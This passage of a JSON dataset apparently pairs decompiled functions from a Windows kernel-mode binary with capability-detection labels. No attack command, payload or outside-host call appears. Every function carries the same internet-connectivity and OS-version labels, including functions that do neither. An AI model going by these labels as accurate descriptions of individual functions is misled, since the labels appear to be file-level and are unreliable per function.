            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00055440(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint var_10h;\n    uint var_ch;\n    uchar var_5h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    var_4h = fcn.000538d0(*(arg_ch + 4), &var_5h);\n    if ((var_4h == 0) || (cVar1 = *(var_4h + 0x154),  (**0xb1bde010)(),  cVar1 != '\\0')) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = (**(arg_8h + 4))(*(arg_8h + 8), *(arg_ch + 8), arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n    }\n    return uVar2;\n}\n",
        "token_count": 256
    },
    "000554e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.000554e0(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint32_t arg_14h, uint arg_18h, uint32_t *arg_1ch, \n            uint arg_20h, uint *arg_24h)\n\n{\n    char cVar1;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_9h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    var_4h = fcn.000538d0(*(arg_ch + 4), &var_9h);\n    if (var_4h == 0) {\n        var_18h = (**(arg_8h + 4))(*(arg_8h + 8), *(arg_ch + 8), arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h);\n    }\n    else {\n        *0x8 = var_4h + 0xb0;\n        if (*(var_4h + 0x154) == '\\0') {\n            if (*(var_4h + 0x155) == '\\0') {\n                cVar1 = fcn.00055a00(var_4h, *(var_4h + 0xb6), arg_14h & 0xffff0000 | *(var_4h + 0xb4), arg_20h, arg_14h\n                                    );\n                if (cVar1 == '\\0') {\n                    (**0xb1bde010)();\n                    var_4h = 0;\n                    if (*(arg_8h + 4) == 0) {\n                        *arg_1ch = 0;\n                        *arg_24h = 0;\n                        var_18h = 0xc000021b;\n                    }\n                    else {\n                        var_18h = (**(arg_8h + 4))(*(arg_8h + 8), *(arg_ch + 8), arg_10h, arg_14h, arg_18h, arg_1ch, \n                                                   arg_20h, arg_24h);\n                    }\n                }\n                else {\n                    *arg_1ch = arg_14h;\n                    *arg_24h = 0;\n                    var_18h = 0;\n                }\n            }\n            else {\n                (**0xb1bde010)();\n                var_4h = 0;\n                var_18h = (**(arg_8h + 4))(*(arg_8h + 8), *(arg_ch + 8), arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, \n                                           arg_24h);\n            }\n        }\n        else {\n            *arg_1ch = 0;\n            *arg_24h = 0;\n            var_18h = 0xc000021b;\n        }\n    }\n    if (var_4h != 0) {\n        (**0xb1bde010)();\n    }\n    return var_18h;\n}\n",
        "token_count": 693
    },
    "00055700": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n\nuint __cdecl\nfcn.00055700(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint32_t arg_14h, int32_t arg_18h, int32_t *arg_1ch, \n            uint arg_20h)\n\n{\n    char cVar1;\n    int32_t var_28h;\n    uint32_t var_24h;\n    uint32_t var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_9h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h;\n    var_10h = arg_ch;\n    var_4h = 0;\n    var_4h = fcn.000538d0(*(arg_ch + 4), &var_9h);\n    if (var_4h == 0) {\n        var_18h = (**(var_14h + 4))(*(var_14h + 8), *(var_10h + 8), arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n    }\n    else {\n        *0x4 = var_4h + 0xb0;\n        if (*(var_4h + 0x154) == '\\0') {\n            if (*(var_4h + 0x155) == '\\0') {\n                if (*arg_1ch == 0) {\n                    if ((*(arg_1ch + 6) & 5) == 0) {\n                        var_28h = (**0xb1bde224)(arg_1ch, 0);\n                    }\n                    else {\n                        var_28h = arg_1ch[3];\n                    }\n                    var_1ch = var_28h + arg_18h;\n                    cVar1 = fcn.00055a00(var_4h, *(stack0xfffffff4 + 6), arg_14h & 0xffff0000 | *(stack0xfffffff4 + 4), \n                                         var_1ch, arg_14h);\n                    if (cVar1 == '\\0') {\n                        (**0xb1bde010)();\n                        var_4h = 0;\n                        var_18h = (**(var_14h + 4))(*(var_14h + 8), *(var_10h + 8), arg_10h, arg_14h, arg_18h, arg_1ch, \n                                                    arg_20h);\n                    }\n                    else {\n                        var_18h = 0;\n                    }\n                }\n                else {\n                    var_20h = fcn.00035230(arg_14h);\n                    if (var_20h == 0) {\n                        (**0xb1bde010)();\n                        var_4h = 0;\n                        var_18h = (**(var_14h + 4))(*(var_14h + 8), *(var_10h + 8), arg_10h, arg_14h, arg_18h, arg_1ch, \n                                                    arg_20h);\n                    }\n                    else {\n                        (**0xb1c5a78c)(arg_1ch, arg_18h, var_20h, 0, arg_14h, &var_24h);\n                        var_20h = var_24h;\n                        cVar1 = fcn.00055a00(var_4h, *(stack0xfffffff4 + 6), \n                                             var_24h & 0xffff0000 | *(stack0xfffffff4 + 4), var_24h, var_24h);\n                        if (cVar1 == '\\0') {\n                            (**0xb1bde010)();\n                            var_4h = 0;\n                            var_18h = (**(var_14h + 4))(*(var_14h + 8), *(var_10h + 8), arg_10h, arg_14h, arg_18h, \n                                                        arg_1ch, arg_20h);\n                        }\n                        else {\n                            var_18h = 0;\n                        }\n                        fcn.00035330(var_20h);\n                    }\n                }\n            }\n            else {\n                (**0xb1bde010)();\n                var_4h = 0;\n                var_18h = (**(var_14h + 4))(*(var_14h + 8), *(var_10h + 8), arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h)\n                ;\n            }\n        }\n        else {\n            var_18h = 0xc000021b;\n        }\n    }\n    if (var_4h != 0) {\n        (**0xb1bde010)();\n    }\n    return var_18h;\n}\n",
        "token_count": 1128
    },
    "00055a00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00055a00(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    code *var_4h;\n    \n    if ((*(arg_8h + 0x154) == '\\0') && (*(arg_8h + 0x155) == '\\0')) {\n        iVar2 = fcn.00049580(arg_14h, arg_18h, *(arg_8h + 0x158) == 0);\n        if (iVar2 == 0) {\n            *(arg_8h + 0x158) = *(arg_8h + 0x158) + arg_18h;\n            if (0x100 < *(arg_8h + 0x158)) {\n                *(arg_8h + 0x155) = 1;\n            }\n            uVar1 = 0;\n        }\n        else {\n            (**0xb1bde2e8)();\n            *(arg_8h + 0x154) = 1;\n            var_4h = NULL;\n            var_8h = 0;\n            if (*(arg_8h + 0x24) != 0) {\n                iVar3 = fcn.000538d0(*(arg_8h + 0x24), 0);\n                if ((iVar3 != 0) && (*(iVar3 + 0x3c) != 0)) {\n                    var_4h = *(iVar3 + 0x3c);\n                    var_8h = *(iVar3 + 0x40);\n                }\n            }\n            puVar4 = fcn.00035230(0x614);\n            if (puVar4 == NULL) {\n                (**0xb1bde2e4)();\n                *(arg_8h + 0x154) = 0;\n                *(arg_8h + 0x155) = 1;\n                (*var_4h)(var_8h, *(arg_8h + 0x150), 0, 0, 0, 0, 2);\n                uVar1 = 0;\n            }\n            else {\n                puVar4[6] = iVar2;\n                puVar4[4] = *(arg_8h + 0x1c);\n                puVar4[5] = *(arg_8h + 0x20);\n                puVar4[8] = arg_ch;\n                *(puVar4 + 9) = arg_10h;\n                puVar4[10] = var_4h;\n                puVar4[0xb] = var_8h;\n                puVar4[0xc] = *(arg_8h + 0x150);\n                puVar4[0x184] = arg_18h;\n                if (0x5dc < puVar4[0x184]) {\n                    puVar4[0x184] = 0x5dc;\n                }\n                fcn.0007877e(puVar4 + 0xd, arg_14h, puVar4[0x184]);\n                puVar4[2] = 0xb1c16f80;\n                puVar4[3] = puVar4;\n                *puVar4 = 0;\n                (**0xb1bde218)(puVar4, 1);\n                uVar1 = 1;\n            }\n        }\n    }\n    else {\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 824
    },
    "00055c10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00055dae)\n// WARNING: Removing unreachable block (ram,0x00055da3)\n// WARNING: Removing unreachable block (ram,0x00055dc5)\n// WARNING: Removing unreachable block (ram,0x00055d0a)\n// WARNING: Removing unreachable block (ram,0x00055d3a)\n// WARNING: Removing unreachable block (ram,0x00055d41)\n// WARNING: Removing unreachable block (ram,0x00055d4a)\n// WARNING: Removing unreachable block (ram,0x00055d5d)\n// WARNING: Removing unreachable block (ram,0x00055d66)\n// WARNING: Removing unreachable block (ram,0x00055d76)\n\nuint fcn.00055c10(uint param_1, uint param_2, uint param_3, int32_t param_4, uint *param_5, uint param_6)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t arg_ch;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_ch;\n    uint var_10h;\n    int32_t var_14h;\n    uint *var_18h_2;\n    uint var_1ch_2;\n    uint var_18h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h_2;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0xb1c457e8;\n    uStack16 = 0xb1c4578a;\n    var_10h_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h_2;\n    if (var_14h == 0) {\n        *var_18h_2 = 0;\n        uVar2 = 0;\n    }\n    else {\n        arg_ch = (**0xb1bde230)(3, var_8h, 0, 0, 0, 0, 1, 0, 0);\n        if (arg_ch == 0) {\n            uVar2 = 0xc000009a;\n        }\n        else {\n            iVar3 = (**0xb1bde294)(var_10h, var_14h, 0, 0, arg_ch);\n            if (iVar3 == 0) {\n                (**0xb1bde2ec)();\n                uVar2 = 0xc000009a;\n            }\n            else {\n                var_4h = 0;\n                (**0xb1bde2a0)(iVar3, 0, 2);\n                var_4h = 0xffffffff;\n                iVar1 = *(arg_ch + 0x60);\n                *(iVar1 + -8) = 0;\n                *(iVar1 + -4) = 0;\n                *(iVar1 + -0x21) = 0;\n                iVar1 = *(arg_ch + 0x60);\n                *(iVar1 + -0x24) = 0xf;\n                *(iVar1 + -0x23) = 8;\n                *(iVar1 + -0x10) = var_8h;\n                *(iVar1 + -0xc) = var_ch;\n                *(iVar1 + -0x1c) = 0;\n                *(iVar1 + -0x20) = var_14h;\n                *(arg_ch + 4) = iVar3;\n                uVar2 = fcn.00056290(var_8h, arg_ch, 0xf, var_18h_2, var_1ch_2);\n            }\n        }\n    }\n    *in_FS_OFFSET = var_10h_2;\n    return uVar2;\n}\n",
        "token_count": 869
    },
    "00055e50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00055fe5)\n// WARNING: Removing unreachable block (ram,0x00055fda)\n// WARNING: Removing unreachable block (ram,0x00055ffc)\n// WARNING: Removing unreachable block (ram,0x00055f41)\n// WARNING: Removing unreachable block (ram,0x00055f71)\n// WARNING: Removing unreachable block (ram,0x00055f78)\n// WARNING: Removing unreachable block (ram,0x00055f81)\n// WARNING: Removing unreachable block (ram,0x00055f94)\n// WARNING: Removing unreachable block (ram,0x00055f9d)\n// WARNING: Removing unreachable block (ram,0x00055fad)\n\nuint fcn.00055e50(uint param_1, uint param_2, uint param_3, int32_t param_4)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t arg_ch;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_ch;\n    uint var_10h;\n    int32_t var_14h;\n    uint var_18h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h_2;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0xb1c457d8;\n    uStack16 = 0xb1c4578a;\n    var_10h_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h_2;\n    if (var_14h == 0) {\n        uVar2 = 0;\n    }\n    else {\n        arg_ch = (**0xb1bde230)(3, var_8h, 0, 0, 0, 0, 1, 0, 0);\n        if (arg_ch == 0) {\n            uVar2 = 0xc000009a;\n        }\n        else {\n            iVar3 = (**0xb1bde294)(var_10h, var_14h, 0, 0, arg_ch);\n            if (iVar3 == 0) {\n                (**0xb1bde2ec)();\n                uVar2 = 0xc000009a;\n            }\n            else {\n                var_4h = 0;\n                (**0xb1bde2a0)(iVar3, 0, 0);\n                var_4h = 0xffffffff;\n                iVar1 = *(arg_ch + 0x60);\n                *(iVar1 + -8) = 0;\n                *(iVar1 + -4) = 0;\n                *(iVar1 + -0x21) = 0;\n                iVar1 = *(arg_ch + 0x60);\n                *(iVar1 + -0x24) = 0xf;\n                *(iVar1 + -0x23) = 7;\n                *(iVar1 + -0x10) = var_8h;\n                *(iVar1 + -0xc) = var_ch;\n                *(iVar1 + -0x1c) = 0;\n                *(iVar1 + -0x20) = var_14h;\n                *(arg_ch + 4) = iVar3;\n                uVar2 = fcn.00056290(var_8h, arg_ch, 0xf, 0, 0xffffffff);\n            }\n        }\n    }\n    *in_FS_OFFSET = var_10h_2;\n    return uVar2;\n}\n",
        "token_count": 816
    },
    "00056090": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0005616b)\n// WARNING: Removing unreachable block (ram,0x00056160)\n// WARNING: Removing unreachable block (ram,0x00056182)\n// WARNING: Removing unreachable block (ram,0x000560c7)\n// WARNING: Removing unreachable block (ram,0x000560f7)\n// WARNING: Removing unreachable block (ram,0x000560fe)\n// WARNING: Removing unreachable block (ram,0x00056107)\n// WARNING: Removing unreachable block (ram,0x0005611a)\n// WARNING: Removing unreachable block (ram,0x00056123)\n// WARNING: Removing unreachable block (ram,0x00056133)\n\nuint __cdecl fcn.00056090(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t arg_ch_00;\n    uint uVar2;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_ch_00 = (**0xb1bde230)(3, arg_8h, 0, 0, 0, 0, 1, 0, 0);\n    if (arg_ch_00 == 0) {\n        uVar2 = 0xc000009a;\n    }\n    else {\n        iVar1 = *(arg_ch_00 + 0x60);\n        *(iVar1 + -8) = 0;\n        *(iVar1 + -4) = 0;\n        *(iVar1 + -0x21) = 0;\n        iVar1 = *(arg_ch_00 + 0x60);\n        *(iVar1 + -0x24) = 0xf;\n        *(iVar1 + -0x23) = 6;\n        *(iVar1 + -0x10) = arg_8h;\n        *(iVar1 + -0xc) = arg_ch;\n        *(iVar1 + -0x20) = 4;\n        *(iVar1 + -0x1c) = 0;\n        *(iVar1 + -0x18) = 0;\n        *(iVar1 + -0x14) = 0;\n        uVar2 = fcn.00056290(arg_8h, arg_ch_00, 0xf, 0, 0xffffffff);\n    }\n    return uVar2;\n}\n",
        "token_count": 526
    },
    "00056210": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00056210(uint noname_0, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_5h;\n    \n    *NULL = fcn.000538d0(arg_ch, &var_5h);\n    if (*NULL != 0) {\n        while (*(stack0xfffffff8 + 0x15c) != stack0xfffffff8 + 0x15c) {\n            iVar1 = fcn.00052b60(stack0xfffffff8 + 0x15c);\n            *(iVar1 + -0x40) = 0;\n            (**0xb1bde2ec)();\n        }\n        (**0xb1bde010)();\n    }\n    return;\n}\n",
        "token_count": 172
    },
    "00056290": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00056290(int32_t arg_8h, int32_t arg_ch, uint noname_2, uint *arg_14h, int32_t arg_18h)\n\n{\n    int32_t iVar1;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_9h;\n    uint var_4h;\n    \n    var_9h._0_1_ = '\\0';\n    (**0xb1bde0cc)(&var_24h, 0, 0);\n    *(arg_ch + 0x2c) = &var_24h;\n    *(arg_ch + 0x28) = &var_9h + 1;\n    stack0xfffffff4 = 0xc0000001;\n    if (arg_18h != -1) {\n        iVar1 = *(arg_ch + 0x60);\n        var_28h = iVar1 + -0x24;\n        *(iVar1 + -8) = 0xb1c452c0;\n        *(iVar1 + -4) = &var_24h;\n        *(iVar1 + -0x21) = 0;\n        *(iVar1 + -0x21) = 0x40;\n        *(iVar1 + -0x21) = *(iVar1 + -0x21) | 0x80;\n        *(iVar1 + -0x21) = *(iVar1 + -0x21) | 0x20;\n    }\n    *(arg_ch + 0x23) = *(arg_ch + 0x23) + -1;\n    iVar1 = *(arg_ch + 0x60);\n    var_10h = iVar1 + -0x24;\n    *(arg_ch + 0x60) = var_10h;\n    *(iVar1 + -0x10) = arg_8h;\n    var_14h = (**(*(arg_8h + 8) + 0x38 + **(arg_ch + 0x60) * 4))(arg_8h, arg_ch);\n    if (var_14h == 0x103) {\n        if (arg_18h == -1) {\n            (**0xb1bde30c)(&var_24h, 0, 0, 0, 0);\n        }\n        else {\n            _var_30h = fcn.00078778(arg_18h, arg_18h >> 0x1f, 0xffffd8f0, 0xffffffff);\n            iVar1 = (**0xb1bde30c)(&var_24h, 0, 0, 0, &var_30h);\n            if (iVar1 == 0x102) {\n                var_9h._0_1_ = '\\x01';\n                (**0xb1bde234)(arg_ch);\n                (**0xb1bde30c)(&var_24h, 0, 0, 0, 0);\n            }\n        }\n    }\n    if (arg_18h != -1) {\n        (**0xb1bde2ec)();\n    }\n    var_14h = stack0xfffffff4;\n    if (var_9h != '\\0') {\n        var_14h = 0x102;\n    }\n    if (arg_14h != NULL) {\n        *arg_14h = var_4h;\n    }\n    return var_14h;\n}\n",
        "token_count": 798
    },
    "00056440": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00056440(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    iVar2 = arg_ch;\n    pcVar1 = fcn.000639f0(arg_8h);\n    iVar2 = (*pcVar1)(arg_8h, iVar2, arg_10h, arg_14h, arg_18h);\n    if ((iVar2 != 0) && ((*(arg_ch + 4) == 0x102 || (*(arg_ch + 4) == 0x109)))) {\n        fcn.00056520(arg_ch, *(arg_ch + 4) == 0x109);\n    }\n    return iVar2;\n}\n",
        "token_count": 190
    },
    "000564b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000564b0(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint32_t arg_1ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint var_4h;\n    \n    iVar2 = arg_ch;\n    uVar3 = arg_1ch;\n    pcVar1 = fcn.000639f0(arg_8h);\n    iVar2 = (*pcVar1)(arg_8h, iVar2, arg_10h, arg_14h, arg_18h, uVar3);\n    if (((iVar2 != 0) && ((arg_1ch & 1) != 0)) && ((*(arg_ch + 4) == 0x102 || (*(arg_ch + 4) == 0x109)))) {\n        fcn.00056520(arg_ch, *(arg_ch + 4) == 0x109);\n    }\n    return iVar2;\n}\n",
        "token_count": 235
    },
    "00056520": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00056520(uint *arg_8h, uint arg_ch)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint var_a8h;\n    uint var_a0h;\n    uint *var_9ch;\n    uint var_98h;\n    uint var_40h;\n    int32_t var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    uint var_14h;\n    \n    cVar2 = fcn.00056ee0(2);\n    if ((cVar2 != '\\0') && ((arg_8h[3] & 0x80000000) == 0)) {\n        var_3ch = (**0xb1c67734)(*arg_8h, 0);\n        if (var_3ch != *0xb1c4635c) {\n            *0xb1c4635c = var_3ch;\n            iVar3 = fcn.00036880(&var_14h, 0x11);\n            if (iVar3 == 0) {\n                var_14h._0_2_ = *0xb1be26d4;\n            }\n            fcn.00035e60(&var_40h);\n            fcn.000362e0(&var_40h, &var_38h);\n            fcn.000785aa(&var_98h, 0xb1be26d8, var_24h + 0x76c, var_28h + 1, var_2ch, var_30h, var_34h, var_38h, \n                         &var_14h);\n            var_9ch = &var_98h;\n            do {\n                iVar1 = *var_9ch;\n                var_9ch = var_9ch + 2;\n            } while (iVar1 != 0);\n            fcn.00056eb0(2, &var_98h, (var_9ch - (&var_98h + 2) >> 1) << 1);\n        }\n        fcn.00056eb0(2, arg_8h + 2, (-(arg_ch != '\\0') & 2) + 2);\n    }\n    return;\n}\n",
        "token_count": 541
    },
    "00056670": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Switch with 1 destination removed at 0x000566c3 : 36 cases all go to same destination\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00056670(void)\n\n{\n    int32_t iVar1;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_1dh;\n    uint var_1h;\n    \n    var_1dh._0_1_ = '\\0';\n    var_1h._0_1_ = '\\0';\n    if (*0xb1c67738 == -1) {\n        var_24h = 0x21590001;\n    }\n    else if (*0xb1c67738 == 0) {\n        iVar1 = fcn.00034c90();\n        if (iVar1 - 3U < 0x24) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        *0xb1c67738 = -1;\n        var_24h = 0x21590001;\n    }\n    else {\n        var_24h = fcn.00056cb0(2);\n        if (var_24h == 0) {\n            var_1dh._0_1_ = '\\x01';\n            if (*0xb1c5b706 != '\\0') {\n                return 0x21590006;\n            }\n            var_24h = fcn.00063a60(2, *0xb1c5a7b8, 0xb1c67734);\n            if (((var_24h == 0) && (var_24h = fcn.00063130(2, *0xb1c67738, 0xb1c23440, 0xb1c6772c),  var_24h == 0)) &&\n               (var_24h = fcn.00063130(2, *0xb1c5a7b4, 0xb1c234b0, 0xb1c67730),  var_24h == 0)) {\n                fcn.00063a90(0xb1c6772c);\n                fcn.00063a90(0xb1c67730);\n                *0xb1c4635c = 0;\n                *0xb1c5b706 = '\\x01';\n                var_24h = 0;\n            }\n        }\n        if (var_24h != 0) {\n            if (var_1dh != '\\0') {\n                fcn.00056e30(2, 1);\n            }\n            fcn.00063a90(*0xb1c67730);\n            fcn.000635f0(0xb1c67730);\n            fcn.00063a90(*0xb1c6772c);\n            fcn.000635f0(0xb1c6772c);\n        }\n        if (var_1h != '\\0') {\n            (**0xb1bde1b4)(&var_1dh + 1);\n        }\n    }\n    return var_24h;\n}\n",
        "token_count": 710
    },
    "000569c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.000569c0(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    if (*0xb1c5b707 == '\\0') {\n        fcn.000344f0(0xb1c5a7cc);\n        iVar1 = fcn.00033ff0(0xb1c5a7c8);\n        if (iVar1 == 0) {\n            var_4h = -1;\n        }\n        else {\n            fcn.00032220(0xb1c5a7bc);\n            *0xb1c6773c = fcn.00035230(0x960);\n            if (*0xb1c6773c == 0) {\n                var_4h = 0x21590004;\n            }\n            else {\n                fcn.00078790(*0xb1c6773c, 0, 0x960);\n                *0xb1c5a7d0 = 0;\n                *0xb1c5a7d4 = 0;\n                iVar1 = fcn.0001a8e0(0xb1c5a7c0, 0xb1c24090, 0);\n                if (iVar1 == 0) {\n                    *0xb1c5b707 = '\\x01';\n                    var_4h = 0;\n                }\n                else {\n                    *0xb1c5b707 = '\\0';\n                    var_4h = fcn.00035620();\n                }\n                for (var_8h = 0; var_8h < 4; var_8h = var_8h + 1) {\n                    uVar2 = fcn.00029470(*(var_8h * 0x3c + -0x4e3a8460), 0);\n                    *(var_8h * 0x3c + -0x4e3a845c) = uVar2;\n                    if (*(var_8h * 0x3c + -0x4e3a845c) == 0) {\n                        *(var_8h * 0x3c + -0x4e3a845c) = 0xffffffff;\n                    }\n                    uVar2 = fcn.00029470(*(var_8h * 0x3c + -0x4e3a8458), 0);\n                    *(var_8h * 0x3c + -0x4e3a8454) = uVar2;\n                    if (*(var_8h * 0x3c + -0x4e3a8454) == 0) {\n                        *(var_8h * 0x3c + -0x4e3a8454) = 0xffffffff;\n                    }\n                    iVar1 = fcn.00029470(*(var_8h * 0x3c + -0x4e3a8468), 0);\n                    if (iVar1 != 0) {\n                        (**(var_8h * 0x3c + -0x4e3a843c))(var_8h);\n                    }\n                }\n            }\n            if (var_4h != 0) {\n                fcn.00034520(0xb1c5a7cc);\n                fcn.00034080(0xb1c5a7c8);\n                fcn.00035330(*0xb1c6773c);\n                *0xb1c6773c = 0;\n            }\n        }\n    }\n    else {\n        var_4h = 0x21590006;\n    }\n    return var_4h;\n}\n",
        "token_count": 818
    },
    "00056b90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
